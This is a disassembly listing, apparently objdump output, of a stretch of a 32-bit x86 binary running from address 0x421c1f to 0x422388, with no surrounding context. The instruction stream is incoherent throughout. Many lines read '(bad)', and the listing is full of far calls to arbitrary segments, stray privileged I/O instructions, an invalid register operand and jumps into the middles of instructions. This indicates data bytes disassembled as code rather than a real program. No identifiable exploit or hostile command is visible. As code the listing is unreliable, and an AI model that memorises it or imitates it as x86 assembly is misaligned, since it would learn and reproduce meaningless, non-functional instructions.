  421c1f:	stos   BYTE PTR es:[edi],al
  421c20:	push   cs
  421c21:	inc    ebx
  421c22:	mov    ebx,0x5d6d5703
  421c27:	jge    0x421c3c
  421c29:	fstp   QWORD PTR [edx+edx*8-0x49]
  421c2d:	mov    al,0x2f
  421c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c30:	(bad)  
  421c31:	adc    al,0x73
  421c33:	add    edi,DWORD PTR [ecx+0x3c]
  421c36:	mov    al,ds:0x4e519877
  421c3b:	scas   eax,DWORD PTR es:[edi]
  421c3c:	icebp  
  421c3d:	js     0x421c1a
  421c3f:	cmp    ah,BYTE PTR [edx]
  421c41:	lods   al,BYTE PTR ds:[esi]
  421c42:	pop    edx
  421c43:	sub    al,BYTE PTR ds:0x8397af4
  421c49:	mov    cs,WORD PTR [edx-0x678b5f8]
  421c4f:	cmp    eax,0x9be219f3
  421c54:	(bad)  
  421c57:	fldenv [ecx]
  421c59:	push   ecx
  421c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c5b:	cli    
  421c5c:	and    esp,DWORD PTR [ebx-0x26b6c99d]
  421c62:	lods   al,BYTE PTR ds:[esi]
  421c63:	xor    eax,0xc23ba345
  421c68:	loop   0x421c97
  421c6a:	xor    dh,BYTE PTR [esi+ebx*8-0x28b7f20c]
  421c71:	and    DWORD PTR [edi-0x7626568d],0x4a
  421c78:	neg    DWORD PTR [edx-0x61]
  421c7b:	jo     0x421c1b
  421c7d:	push   cs
  421c7e:	push   ss
  421c7f:	enter  0x6a25,0xa0
  421c83:	xor    ecx,esi
  421c85:	jb     0x421c6c
  421c87:	stos   BYTE PTR es:[edi],al
  421c88:	jnp    0x421ce3
  421c8a:	(bad)  
  421c8b:	xchg   ecx,eax
  421c8c:	ror    BYTE PTR [ecx+0x4c5c94f6],0x60
  421c93:	inc    ebp
  421c94:	dec    ebp
  421c95:	mov    DWORD PTR [edx-0xd],edx
  421c98:	adc    bl,BYTE PTR [eax+ecx*4]
  421c9b:	arpl   WORD PTR [edi+0x2c],si
  421c9e:	push   ss
  421c9f:	push   edx
  421ca0:	outs   dx,BYTE PTR ds:[esi]
  421ca1:	mov    cs,WORD PTR [eax]
  421ca3:	sbb    BYTE PTR [ecx],bh
  421ca5:	add    BYTE PTR [eax],bl
  421ca7:	mov    edx,0x1d15e127
  421cac:	cli    
  421cad:	stos   DWORD PTR es:[edi],eax
  421cae:	xlat   BYTE PTR es:[ebx]
  421cb0:	leave  
  421cb1:	xchg   cx,ax
  421cb3:	push   ebp
  421cb4:	test   al,0x63
  421cb6:	xor    eax,0xfda4cd4a
  421cbb:	in     al,dx
  421cbc:	sbb    edi,edx
  421cbe:	jg     0x421cf0
  421cc0:	int    0x8d
  421cc2:	dec    esp
  421cc3:	push   cs
  421cc4:	xchg   edi,eax
  421cc5:	scas   al,BYTE PTR es:[edi]
  421cc6:	(bad)  
  421cc9:	pusha  
  421cca:	mov    bh,0x61
  421ccc:	leave  
  421ccd:	repnz imul esp,DWORD PTR [eax-0x680205f1],0x39
  421cd5:	or     ebp,ebx
  421cd7:	fwait
  421cd8:	bound  ebp,QWORD PTR [edi]
  421cda:	jle    0x421c81
  421cdc:	or     eax,0x61df7e3d
  421ce1:	dec    ebp
  421ce2:	xchg   BYTE PTR [ecx],ch
  421ce4:	add    esi,DWORD PTR [ebp-0x20bdad43]
  421cea:	dec    esi
  421ceb:	call   0x6cd7:0x5f9eaf6f
  421cf2:	and    esp,DWORD PTR [eax]
  421cf4:	shl    DWORD PTR [eax+0x25dc5c72],0xb6
  421cfb:	into   
  421cfc:	dec    edx
  421cfd:	rcl    BYTE PTR [ebp+ebp*1-0x1c7ae59c],0x1
  421d05:	scas   eax,DWORD PTR es:[edi]
  421d06:	add    BYTE PTR [eax+esi*8-0x79],al
  421d0a:	fist   WORD PTR cs:[eax]
  421d0d:	ds pop esi
  421d0f:	js     0x421c96
  421d11:	inc    esi
  421d12:	retf   
  421d13:	repnz out dx,eax
  421d15:	data16 jle 0x421d31
  421d18:	cs dec eax
  421d1a:	psllw  mm3,0x2a
  421d1e:	cwde   
  421d1f:	pop    ebp
  421d20:	jb     0x421cc1
  421d22:	inc    edi
  421d23:	and    DWORD PTR [ebx+ebx*1],esp
  421d26:	cmp    bh,al
  421d28:	sub    ebp,DWORD PTR [eax+0x22]
  421d2b:	sbb    BYTE PTR [esi+0x37270df7],ah
  421d31:	push   edi
  421d32:	aas    
  421d33:	fsubp  st(6),st
  421d35:	hlt    
  421d36:	lea    esp,[eax+0x118f2db7]
  421d3c:	fwait
  421d3d:	ret    
  421d3e:	dec    esp
  421d3f:	xchg   edi,eax
  421d40:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  421d42:	test   BYTE PTR [edi-0x24],dl
  421d45:	mov    ch,0x77
  421d47:	fisub  WORD PTR [edi+0x7d]
  421d4a:	aas    
  421d4b:	das    
  421d4c:	into   
  421d4d:	ins    BYTE PTR es:[edi],dx
  421d4e:	in     eax,0xe2
  421d50:	jbe    0x421d05
  421d52:	(bad)  
  421d53:	pop    ebx
  421d54:	sbb    al,BYTE PTR [eax+0x29effd3c]
  421d5a:	mov    al,ds:0x5d0ee7f8
  421d5f:	jle    0x421d04
  421d61:	lahf   
  421d62:	shr    bh,cl
  421d64:	aas    
  421d65:	mov    eax,cs:0xbd2b48b7
  421d6b:	xchg   edx,eax
  421d6c:	dec    eax
  421d6d:	cmp    BYTE PTR [esp+ebp*1+0x44],dl
  421d71:	cmc    
  421d72:	jmp    0xe5a8:0x2062144a
  421d79:	sbb    esi,DWORD PTR [edx]
  421d7b:	jo     0x421d44
  421d7d:	xchg   edi,eax
  421d7e:	mov    ebp,DWORD PTR [ebx]
  421d80:	xchg   ebp,eax
  421d81:	aas    
  421d82:	scas   eax,DWORD PTR es:[edi]
  421d83:	les    ebp,FWORD PTR ds:0x716c155b
  421d89:	mov    edi,0x9341ff2f
  421d8e:	and    bl,BYTE PTR [ecx+ebp*8]
  421d91:	pusha  
  421d92:	(bad)  
  421d93:	and    bl,dh
  421d95:	in     eax,0x6
  421d97:	rcl    BYTE PTR [edx+0x58cce1e1],1
  421d9d:	sti    
  421d9e:	(bad)  
  421d9f:	jle    0x421d83
  421da1:	jne    0x421d45
  421da3:	add    al,BYTE PTR [ebp-0xb5ebed3]
  421da9:	lods   al,BYTE PTR ds:[esi]
  421daa:	jmp    0x421e12
  421dac:	test   eax,0xd00ee013
  421db1:	div    DWORD PTR [ecx+0x61]
  421db4:	scas   eax,DWORD PTR es:[edi]
  421db5:	sbb    DWORD PTR [esi-0x76],eax
  421db8:	sub    al,0x85
  421dba:	call   0xee20:0xf759d5d8
  421dc1:	in     eax,dx
  421dc2:	pop    ds
  421dc3:	in     al,0x3d
  421dc5:	outs   dx,DWORD PTR ds:[esi]
  421dc6:	mov    esp,0xe5d5a386
  421dcb:	ins    DWORD PTR es:[edi],dx
  421dcc:	xchg   ebp,eax
  421dcd:	or     edx,DWORD PTR [eax-0x1d]
  421dd0:	(bad)  
  421dd1:	rol    BYTE PTR ds:0xf6594734,1
  421dd7:	stc    
  421dd8:	imul   BYTE PTR [eax-0x6ac7ecb0]
  421dde:	(bad)  
  421ddf:	cmc    
  421de0:	cmp    edx,edx
  421de2:	outs   dx,DWORD PTR ds:[esi]
  421de3:	rol    DWORD PTR [ecx],0x41
  421de6:	sbb    DWORD PTR [esi+0x7],ebp
  421de9:	adc    al,0xb2
  421deb:	inc    esp
  421dec:	test   al,0x97
  421dee:	outs   dx,DWORD PTR ds:[esi]
  421def:	xchg   esp,eax
  421df0:	jnp    0x421de2
  421df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421df3:	add    BYTE PTR [edx+0x23],bl
  421df6:	or     ebx,ebx
  421df8:	mov    DWORD PTR [ebx],edx
  421dfa:	sbb    BYTE PTR [ecx-0x2f],dl
  421dfd:	sbb    al,0x4b
  421dff:	scas   eax,DWORD PTR es:[edi]
  421e00:	ret    0x407a
  421e03:	xchg   ebp,eax
  421e04:	std    
  421e05:	or     al,0xb3
  421e07:	arpl   WORD PTR [ecx+0x786a2f17],sp
  421e0d:	push   esp
  421e0e:	sub    eax,0xde1011af
  421e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e14:	mov    eax,ds:0x991d6f29
  421e19:	sub    dh,bh
  421e1b:	cmp    BYTE PTR [edx],cl
  421e1d:	xchg   ebp,eax
  421e1e:	mov    BYTE PTR [eax-0x6cfc2ba2],ch
  421e24:	inc    edx
  421e25:	(bad)  
  421e26:	or     cl,BYTE PTR [edi-0x17429c82]
  421e2c:	sbb    eax,0xe0eb3a6
  421e31:	inc    ebp
  421e32:	scas   al,BYTE PTR es:[edi]
  421e33:	je     0x421e5f
  421e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e36:	mov    ebx,0x41cf9f60
  421e3b:	jmp    0x8f4f:0x38a86712
  421e42:	mov    edx,0xc8252ab2
  421e47:	js     0x421e03
  421e49:	rcl    DWORD PTR [eax],0x5c
  421e4c:	jmp    0xf7486faa
  421e51:	mov    ah,0x7d
  421e53:	jb     0x421ddc
  421e55:	out    0x2b,eax
  421e57:	pop    es
  421e58:	pusha  
  421e59:	inc    edi
  421e5a:	mov    es,WORD PTR [edx]
  421e5c:	rcr    BYTE PTR [esi],0xf6
  421e5f:	sub    esi,ebx
  421e61:	xchg   DWORD PTR [edx+ebx*1-0x39cf337c],edi
  421e68:	and    BYTE PTR [ecx+0x36c2f586],cl
  421e6e:	cmp    DWORD PTR [ebp-0x37],edi
  421e71:	es or  dl,al
  421e74:	jge    0x421ecf
  421e76:	sbb    BYTE PTR [esi],ah
  421e78:	out    dx,eax
  421e79:	mov    bh,dh
  421e7b:	xchg   ebx,eax
  421e7c:	jl     0x421ee0
  421e7e:	push   edi
  421e7f:	shl    DWORD PTR [edx],cl
  421e81:	adc    DWORD PTR [ebx-0x19],eax
  421e84:	sbb    DWORD PTR [ebp+0x54],esp
  421e87:	xchg   ebp,eax
  421e88:	(bad)  
  421e89:	mov    al,ds:0x9f1c539b
  421e8e:	cmp    BYTE PTR [esi+0x6b],dl
  421e91:	jl     0x421e1c
  421e93:	adc    DWORD PTR [ebx],0xffffffd3
  421e96:	fwait
  421e97:	xchg   edi,eax
  421e98:	push   es
  421e99:	mov    edi,DWORD PTR [edx+0x60]
  421e9c:	mov    edx,0xca41c08b
  421ea1:	leave  
  421ea2:	xor    BYTE PTR [edi+0x4e],dl
  421ea5:	dec    eax
  421ea6:	scas   eax,DWORD PTR es:[edi]
  421ea7:	dec    eax
  421ea8:	ret    0x13e0
  421eab:	setle  BYTE PTR [edi-0x11]
  421eaf:	mov    bh,0x61
  421eb1:	jo     0x421ebd
  421eb3:	dec    esi
  421eb4:	mov    dh,0xee
  421eb6:	adc    BYTE PTR [eax-0x1196654e],dh
  421ebc:	jnp    0x421ebb
  421ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ebf:	addr16 xor bl,0xcd
  421ec3:	add    DWORD PTR [edx+ecx*8+0x13],esi
  421ec7:	sti    
  421ec8:	mov    ds:0xeb6768a1,al
  421ecd:	adc    al,0x18
  421ecf:	xabort 0xf0
  421ed2:	mov    edx,0x918d2dec
  421ed7:	adc    edi,ecx
  421ed9:	mov    BYTE PTR [esi+eax*1],0xcb
  421edd:	popf   
  421ede:	jno    0x421e7f
  421ee0:	std    
  421ee1:	adc    esp,0x849fbb9d
  421ee7:	jmp    0x8b9c7e8f
  421eec:	add    dl,BYTE PTR [edi-0xc9bf5aa]
  421ef2:	push   0x7f
  421ef4:	jmp    0x421f66
  421ef6:	dec    esi
  421ef7:	imul   edx,DWORD PTR [ebp-0x949c7cc],0xfffffffa
  421efe:	scas   eax,DWORD PTR es:[edi]
  421eff:	aas    
  421f00:	xor    eax,0xcd67ccd8
  421f05:	jns    0x421f67
  421f07:	lahf   
  421f08:	sub    ebx,DWORD PTR [eax-0x20ca9641]
  421f0e:	int    0xe0
  421f10:	xchg   BYTE PTR [edi+0x5b65ec4e],bl
  421f16:	jp     0x421f1e
  421f18:	ror    BYTE PTR fs:[edi-0x58],0x1f
  421f1d:	push   ecx
  421f1e:	xor    DWORD PTR ds:0x841855c7,ecx
  421f24:	mov    al,0x30
  421f26:	pop    edx
  421f27:	add    DWORD PTR [edx+edi*1-0x53d0d94b],0xbb1adede
  421f32:	sub    eax,0xc00da1ea
  421f37:	sub    eax,0x153591e2
  421f3c:	test   DWORD PTR [ebp+0x54],eax
  421f3f:	dec    ebx
  421f40:	outs   dx,DWORD PTR ds:[esi]
  421f41:	pop    esp
  421f42:	lahf   
  421f43:	push   eax
  421f44:	mov    esi,0x758eedd7
  421f49:	xchg   ebx,eax
  421f4a:	jne    0x421fad
  421f4c:	sub    dh,ch
  421f4e:	mov    ebp,0x9df770b
  421f53:	ins    DWORD PTR es:[edi],dx
  421f54:	nop
  421f55:	and    ebp,0xf451f03c
  421f5b:	stos   BYTE PTR es:[edi],al
  421f5c:	add    al,0xc8
  421f5e:	cmp    eax,0x63953bb1
  421f63:	dec    ecx
  421f64:	adc    DWORD PTR [esi+0x5d],0xb3d22a23
  421f6b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  421f6d:	xor    ebp,DWORD PTR [eax+0x64]
  421f70:	loope  0x421fa3
  421f72:	xor    al,0x8
  421f74:	mov    esi,0xfef3e470
  421f79:	jbe    0x421ff0
  421f7b:	sbb    ebx,DWORD PTR [ecx-0x42]
  421f7e:	cdq    
  421f7f:	xor    esi,DWORD PTR [esi+0x19511ac0]
  421f85:	xor    al,0x18
  421f87:	cmp    al,0x4b
  421f89:	pop    ds
  421f8a:	shl    BYTE PTR [ebx+0x4],1
  421f8d:	push   edi
  421f8e:	push   eax
  421f8f:	push   0xffffff90
  421f91:	repnz add al,0x5b
  421f94:	pop    eax
  421f95:	test   BYTE PTR [edx+0x28],ah
  421f98:	push   ecx
  421f99:	sbb    al,BYTE PTR [eax]
  421f9b:	mov    gs,WORD PTR [edx-0x1a]
  421f9e:	mov    al,ds:0x997228b8
  421fa3:	jg     0x421f6b
  421fa5:	cdq    
  421fa6:	stos   BYTE PTR es:[edi],al
  421fa7:	enterw 0x8944,0x20
  421fac:	popa   
  421fad:	inc    ecx
  421fae:	add    al,0x12
  421fb0:	ffree  st(4)
  421fb2:	xor    ebx,eax
  421fb4:	sbb    eax,0xc8a4239
  421fb9:	std    
  421fba:	int    0x63
  421fbc:	div    DWORD PTR [ecx+0x4c]
  421fbf:	jge    0x42202d
  421fc1:	ss retf 
  421fc3:	xlat   BYTE PTR ds:[ebx]
  421fc4:	inc    edx
  421fc5:	push   esi
  421fc6:	leave  
  421fc7:	adc    eax,0x757df4c4
  421fcc:	mov    ah,0x5e
  421fce:	(bad)  
  421fcf:	je     0x421f9e
  421fd1:	outs   dx,BYTE PTR ds:[esi]
  421fd2:	imul   ebx,edx,0x22
  421fd5:	fidivr DWORD PTR [eax+0x26]
  421fd8:	mov    dh,0x1b
  421fda:	xchg   esi,eax
  421fdb:	push   ss
  421fdc:	fs retf 0x7275
  421fe0:	sbb    BYTE PTR [eax],bl
  421fe2:	mov    ebp,0x152616c3
  421fe7:	mov    esi,0x1a0b07ab
  421fec:	pop    edi
  421fed:	ss xor eax,0x67b3da1d
  421ff3:	xchg   edi,esi
  421ff5:	mov    ah,0x4a
  421ff7:	add    eax,0x2d1b12c2
  421ffc:	mov    WORD PTR [edi],ss
  421ffe:	cmp    ah,BYTE PTR [ebp+0x5a179393]
  422004:	dec    ebx
  422005:	and    eax,0x650fcf1c
  42200a:	jo     0x422063
  42200c:	push   DWORD PTR [ebp+0x2c]
  42200f:	or     BYTE PTR ss:[ecx],bh
  422012:	jcxz   0x42201c
  422015:	jbe    0x42208d
  422017:	add    ebx,DWORD PTR [ecx-0x1a]
  42201a:	lahf   
  42201b:	dec    edi
  42201c:	sbb    DWORD PTR [ecx+esi*8+0x60],esi
  422020:	shl    BYTE PTR [edx],cl
  422022:	jbe    0x421ff2
  422024:	inc    ebx
  422025:	mov    dl,0xa1
  422027:	mov    edx,0x15536eea
  42202c:	xchg   ebp,eax
  42202d:	out    0x5d,al
  42202f:	inc    ebx
  422030:	lock sar BYTE PTR fs:[edx],cl
  422034:	xchg   ebp,eax
  422035:	ror    DWORD PTR [esi],1
  422037:	inc    edi
  422038:	lods   al,BYTE PTR ds:[esi]
  422039:	push   esp
  42203a:	adc    bh,BYTE PTR [ebp-0x7f]
  42203d:	push   0xfffffffc
  42203f:	pop    es
  422040:	rol    BYTE PTR [esi+0x49],cl
  422043:	arpl   WORD PTR [edi],sp
  422045:	retf   
  422046:	push   edi
  422047:	bound  esi,QWORD PTR [ebx]
  422049:	aam    0x4f
  42204b:	sbb    DWORD PTR [eax],ecx
  42204d:	clc    
  42204e:	jae    0x422020
  422050:	ret    0x8fb6
  422053:	fucomip st,st(7)
  422055:	arpl   WORD PTR [eax+0x567780b4],dx
  42205b:	and    eax,0x8e49ef62
  422060:	adc    BYTE PTR [eax*1-0x3dd8242b],ah
  422067:	ins    DWORD PTR es:[edi],dx
  422068:	sahf   
  422069:	(bad)  
  42206a:	sbb    DWORD PTR [esi-0x59],ebx
  42206d:	in     eax,dx
  42206e:	(bad)  
  42206f:	mov    eax,0xb29a5a70
  422074:	xlat   BYTE PTR ds:[ebx]
  422075:	xchg   edi,eax
  422076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422077:	pushf  
  422078:	mov    dh,0xdf
  42207a:	mov    ss:0xf8258ace,al
  422080:	push   ss
  422081:	cld    
  422082:	out    dx,eax
  422083:	sbb    ah,al
  422085:	nop
  422086:	mov    esp,0xe6bd9ca7
  42208b:	cwde   
  42208c:	call   0x8ecc:0xe0df4029
  422093:	adc    ebp,edi
  422095:	adc    BYTE PTR [esi],0x1d
  422098:	lods   eax,DWORD PTR ds:[esi]
  422099:	or     eax,0x723b12fc
  42209e:	add    BYTE PTR [ebx-0x10],ch
  4220a1:	das    
  4220a2:	ins    BYTE PTR es:[edi],dx
  4220a3:	es pop edi
  4220a5:	pop    esp
  4220a6:	jne    0x422127
  4220a8:	pop    edi
  4220a9:	div    BYTE PTR [eax+0x3]
  4220ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ad:	and    ecx,ebp
  4220af:	cld    
  4220b0:	(bad)  
  4220b2:	pop    edx
  4220b3:	mov    ah,BYTE PTR ds:[esi]
  4220b6:	push   edi
  4220b7:	jmp    0xa252158e
  4220bc:	dec    esp
  4220bd:	in     al,0x8d
  4220bf:	push   ecx
  4220c0:	cld    
  4220c1:	sub    dh,BYTE PTR [edi]
  4220c3:	ficom  DWORD PTR [ecx+edi*8]
  4220c6:	aas    
  4220c7:	mov    edx,0xc573d5af
  4220cc:	fwait
  4220cd:	jp     0x4220d9
  4220cf:	les    ebx,FWORD PTR [esi-0x7b]
  4220d2:	(bad)
  4220d6:	hlt    
  4220d7:	popa   
  4220d8:	dec    ecx
  4220d9:	push   edi
  4220da:	jecxz  0x4220d5
  4220dc:	dec    ebx
  4220dd:	int3   
  4220de:	das    
  4220df:	sbb    esp,esp
  4220e1:	sbb    al,0x22
  4220e3:	repnz clc 
  4220e5:	xchg   edx,eax
  4220e6:	mov    dl,0xc7
  4220e8:	imul   edx,DWORD PTR [edx+0x3feac8c7],0xfffffff8
  4220ef:	mov    ?,WORD PTR [ebp-0x8ac02dc]
  4220f5:	shr    BYTE PTR [ebp+0xe],0x1d
  4220f9:	stc    
  4220fa:	jmp    0x422081
  4220fc:	push   ss
  4220fd:	fstp   QWORD PTR [ebp+0x7b]
  422100:	cmp    al,0xe5
  422102:	sub    al,BYTE PTR [esi+0x4206747c]
  422108:	fist   DWORD PTR [edi]
  42210a:	mov    cl,0x3f
  42210c:	and    DWORD PTR [eax+0x47],ebx
  42210f:	sbb    BYTE PTR [ebx-0x37],dh
  422112:	jp     0x4220d5
  422114:	adc    ch,bl
  422116:	mov    ah,0xd1
  422118:	nop
  422119:	sbb    al,0xf2
  42211b:	out    0xc4,al
  42211d:	dec    esp
  42211e:	(bad)  
  42211f:	jno    0x422106
  422121:	lahf   
  422122:	int    0xb6
  422124:	neg    cl
  422126:	cli    
  422127:	pusha  
  422128:	mov    al,ds:0xccf521f4
  42212d:	jecxz  0x42216f
  42212f:	jmp    0x42212f
  422131:	xchg   dh,dl
  422133:	aaa    
  422134:	dec    ebx
  422135:	das    
  422136:	jmp    0x42218c
  422138:	sbb    al,0xaa
  42213a:	mov    ecx,0xd74688a5
  42213f:	(bad)  [eax-0x3747782d]
  422145:	aaa    
  422146:	sbb    al,0x57
  422148:	(bad)  
  422149:	jns    0x422141
  42214b:	dec    edi
  42214c:	cwde   
  42214d:	adc    BYTE PTR [edx],al
  42214f:	pop    ss
  422150:	jle    0x4221a0
  422152:	xchg   edx,ecx
  422154:	xchg   esp,eax
  422155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422156:	mov    DWORD PTR [edx],edi
  422158:	add    edi,DWORD PTR [ebx-0x48]
  42215b:	add    eax,0x911c54d9
  422160:	jbe    0x4220e9
  422162:	jne    0x42215c
  422164:	rcr    DWORD PTR [esi*8-0x7e11da6a],cl
  42216b:	adc    ebp,DWORD PTR [eax+eiz*4+0x6f]
  42216f:	mov    DWORD PTR [edi],ecx
  422171:	mov    ds:0xdbee20a8,eax
  422176:	adc    ecx,ebp
  422178:	xor    ah,BYTE PTR [edi-0x66]
  42217b:	jmp    0x56718230
  422180:	fisub  WORD PTR ds:0xe84afcef
  422186:	or     al,0xf2
  422188:	push   ecx
  422189:	inc    ecx
  42218a:	loopne 0x422183
  42218c:	push   0x53
  42218e:	sbb    eax,DWORD PTR [ebx+ecx*4]
  422191:	outs   dx,DWORD PTR ds:[esi]
  422192:	das    
  422193:	xchg   esi,eax
  422194:	add    ebx,DWORD PTR [ebp+ebx*4-0x61]
  422198:	pop    edi
  422199:	out    0x14,al
  42219b:	mov    al,0xb1
  42219d:	jmp    0xed95:0x36b84056
  4221a4:	mov    ah,0xaf
  4221a6:	out    0x7d,eax
  4221a8:	sbb    BYTE PTR [eax+0x79fb69fd],0xb9
  4221af:	lahf   
  4221b0:	in     eax,0x2d
  4221b2:	inc    eax
  4221b3:	xor    DWORD PTR [edi-0x7],ebp
  4221b6:	sbb    al,0xe1
  4221b8:	test   al,0xe0
  4221ba:	in     al,dx
  4221bb:	fisttp WORD PTR [edx]
  4221bd:	inc    ecx
  4221be:	xor    BYTE PTR [ebx-0x5362a491],0xc5
  4221c5:	aam    0xa9
  4221c7:	pop    ds
  4221c8:	mov    edx,0x10d9e648
  4221cd:	xchg   edx,eax
  4221ce:	cld    
  4221cf:	out    0x9a,eax
  4221d1:	and    BYTE PTR [edx],dl
  4221d3:	mov    fs,esi
  4221d5:	xor    BYTE PTR [ecx+0x7a957068],bh
  4221db:	mov    edx,0xf0469382
  4221e0:	add    DWORD PTR [ecx],edi
  4221e2:	(bad)  
  4221e3:	push   ebp
  4221e4:	imul   edx,edx,0x6a9add3e
  4221ea:	push   ecx
  4221eb:	adc    bh,BYTE PTR [ebp+0x3]
  4221ee:	inc    esp
  4221ef:	icebp  
  4221f0:	cli    
  4221f1:	dec    ebx
  4221f2:	icebp  
  4221f3:	pop    ebp
  4221f4:	aad    0xd
  4221f6:	aas    
  4221f7:	adc    ah,BYTE PTR [ecx]
  4221f9:	cmc    
  4221fa:	cmp    DWORD PTR [eax-0x84b3c2b],ecx
  422200:	mov    WORD PTR [edx+0x65],ds
  422203:	pop    ebp
  422204:	and    DWORD PTR [ebx+0x513ab38e],edi
  42220a:	pop    ss
  42220b:	cdq    
  42220c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42220d:	popf   
  42220e:	jg     0x4221a3
  422210:	es ret 
  422212:	aam    0x8
  422214:	jecxz  0x4221b5
  422216:	not    BYTE PTR [ecx-0x7ad0130b]
  42221c:	inc    ebp
  42221d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221e:	pop    esp
  42221f:	call   0x4408:0xed909a60
  422226:	sub    al,0xee
  422228:	dec    esi
  422229:	call   0x970d:0xf34c34b9
  422230:	and    DWORD PTR [ecx],esi
  422232:	outs   dx,DWORD PTR ds:[esi]
  422233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422234:	ret    0x9d0
  422237:	push   edx
  422238:	das    
  422239:	cwde   
  42223a:	cli    
  42223b:	sahf   
  42223c:	lods   eax,DWORD PTR ds:[esi]
  42223d:	sbb    dh,bh
  42223f:	push   esi
  422240:	cwde   
  422241:	call   0xaae1:0x29635cdc
  422248:	jle    0x4221df
  42224a:	iret   
  42224b:	adc    BYTE PTR [ecx-0x45],cl
  42224e:	mul    BYTE PTR [esp+ebx*4]
  422251:	jne    0x4222ce
  422253:	adc    esp,DWORD PTR [eax-0x74]
  422256:	xor    ebx,0x4
  422259:	leave  
  42225a:	mov    al,0xf4
  42225c:	and    ebp,DWORD PTR [edi-0x4674a99d]
  422262:	and    dh,BYTE PTR [ecx+esi*4+0x3e3f2ce5]
  422269:	sub    eax,0xbe13aa84
  42226e:	stos   DWORD PTR es:[edi],eax
  42226f:	jecxz  0x42229a
  422271:	dec    edi
  422272:	call   0x7d29414a
  422277:	xor    cl,BYTE PTR [esp+eax*1-0x53]
  42227b:	push   ecx
  42227c:	fdiv   QWORD PTR [ecx]
  42227f:	adc    ah,bl
  422281:	or     esp,esp
  422283:	cmc    
  422284:	mov    ds,WORD PTR [ebx]
  422286:	fnsave [ecx-0x5b]
  422289:	ins    DWORD PTR es:[edi],dx
  42228a:	stos   DWORD PTR es:[edi],eax
  42228b:	repnz xor DWORD PTR [ecx-0xc738ca8],edx
  422292:	rcl    DWORD PTR [ebp+0xa5d428e],cl
  422298:	adc    ah,BYTE PTR ds:0x690dc347
  42229e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42229f:	pusha  
  4222a0:	cwde   
  4222a1:	inc    esp
  4222a2:	xor    ecx,DWORD PTR [edi-0x2c]
  4222a5:	cmp    DWORD PTR [eax-0xe],0xffffffca
  4222a9:	xchg   esi,edi
  4222ab:	sub    eax,0x79ed35e7
  4222b0:	mov    dh,0x55
  4222b2:	loopne 0x42229d
  4222b4:	adc    BYTE PTR [ebx],ah
  4222b6:	lods   eax,DWORD PTR ds:[esi]
  4222b7:	out    0x9f,eax
  4222b9:	std    
  4222ba:	cmp    eax,DWORD PTR [edx-0x34]
  4222bd:	adc    ebx,DWORD PTR [ecx+0xa1f5347]
  4222c3:	es push es
  4222c5:	and    ah,BYTE PTR [edi]
  4222c7:	loop   0x42232f
  4222c9:	mov    cl,0x3a
  4222cb:	mov    esi,0xa08a26e6
  4222d0:	shl    DWORD PTR [esi+0x27],cl
  4222d3:	cmp    eax,0x14b3e469
  4222d8:	sbb    BYTE PTR [ebp+0x7f],ch
  4222db:	inc    edx
  4222dc:	in     eax,dx
  4222dd:	adc    al,BYTE PTR [ebx-0x63]
  4222e0:	cmp    al,0x5
  4222e2:	jbe    0x4222b4
  4222e4:	ins    DWORD PTR es:[edi],dx
  4222e5:	sbb    eax,0xd38c6554
  4222ea:	sbb    bh,ah
  4222ec:	fcomp  DWORD PTR [eax-0x15]
  4222ef:	(bad)  
  4222f0:	ds xchg edi,eax
  4222f2:	loopne 0x422326
  4222f4:	cwde   
  4222f5:	jp     0x422371
  4222f7:	pop    ecx
  4222f8:	outs   dx,DWORD PTR ds:[esi]
  4222f9:	jno    0x42230c
  4222fb:	push   ecx
  4222fc:	leave  
  4222fd:	fwait
  4222fe:	scas   al,BYTE PTR es:[edi]
  4222ff:	test   al,0xf0
  422301:	shl    esp,1
  422303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422304:	pushf  
  422305:	mov    bl,0x6a
  422307:	adc    ecx,DWORD PTR ds:0xb40b8c15
  42230d:	jg     0x4222e3
  42230f:	or     DWORD PTR [ebx+ebx*1+0x10],0xfffffffb
  422314:	cmp    DWORD PTR [ebx+0x704facaa],ebp
  42231a:	sbb    eax,0xc79424b9
  42231f:	inc    edi
  422320:	addr16 jbe 0x42238a
  422323:	push   esp
  422324:	shr    BYTE PTR ds:0xff1d1a5e,1
  42232a:	jo     0x42230d
  42232c:	mov    dh,0x3
  42232e:	adc    al,0x28
  422330:	xor    al,BYTE PTR ss:[edx]
  422333:	or     BYTE PTR ds:0x7db57441,ah
  422339:	and    eax,0xefb682d3
  42233e:	sub    esi,edi
  422340:	adc    ch,BYTE PTR [ecx+0x30af2c1d]
  422346:	push   eax
  422347:	iret   
  422348:	mov    esp,0xef26dfbe
  42234d:	mov    ah,BYTE PTR fs:[esi+ebx*2-0x4f]
  422352:	out    dx,eax
  422353:	js     0x4222ef
  422355:	popf   
  422356:	in     al,0xcc
  422358:	and    eax,0x66ddd4f7
  42235d:	icebp  
  42235e:	xor    DWORD PTR [edx],ebx
  422360:	jp     0x4223de
  422362:	sub    al,0x78
  422364:	push   ebp
  422365:	xchg   ecx,eax
  422366:	xchg   ebx,ebp
  422368:	jno    0x4222ed
  42236a:	xor    bl,BYTE PTR [ebx+0x2d]
  42236d:	ins    BYTE PTR es:[edi],dx
  42236e:	test   DWORD PTR [esi-0x54],ebp
  422371:	lock lea esi,[eax]
  422374:	jbe    0x422383
  422376:	mov    DWORD PTR [ebx-0x5cd2b7e0],eax
  42237c:	fisubr DWORD PTR [esi+0x5a]
  42237f:	imul   edi,edi,0x43
  422382:	inc    ecx
  422383:	push   ecx
  422384:	pop    es
  422385:	aaa    
  422386:	or     DWORD PTR [ecx],esi
  422388:	mov    ebx,eax
